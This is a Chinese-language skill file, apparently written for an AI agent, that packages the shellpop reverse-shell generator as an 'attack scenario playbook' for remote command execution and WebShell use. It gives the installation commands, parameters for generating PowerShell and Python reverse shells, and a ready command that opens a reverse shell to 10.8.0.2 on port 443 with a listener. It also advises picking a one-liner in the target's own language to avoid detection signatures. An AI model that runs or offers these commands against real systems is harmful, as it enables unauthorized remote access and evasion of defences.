---
name: shellpop-shell-gen
description: 渗透工具 skill:shellpop 的安装、参数速查与攻击场景 playbook。当任务涉及 远程命令执行与WebShell 需要调用 shellpop 时使用。
---

# shellpop

- 攻击大类:C13 远程命令执行与WebShell
- 上游仓库:https://github.com/0x00-0x00/shellpop
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/0x00-0x00/shellpop && cd shellpop && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `shellpop --list` | 列全部 payload |
| `shellpop --payload windows/reverse/tcp/powershell --host x --port 443` | 生成 PS 反弹 |
| `shellpop --payload linux/reverse/tcp/python --host x --port 443` | Python 反弹 |
| `--handler` | 同时起监听 |

## 攻击场景 Playbook

### 受限环境选最优反弹方式

```bash
shellpop --list | grep -i 'php\|python'
shellpop --payload linux/reverse/tcp/python --host 10.8.0.2 --port 443 --handler
```

## 注意事项

聚合 20+ 语言的反弹 shell one-liner;目标有 python/perl/php 时用对应版避免裸 sh 特征。
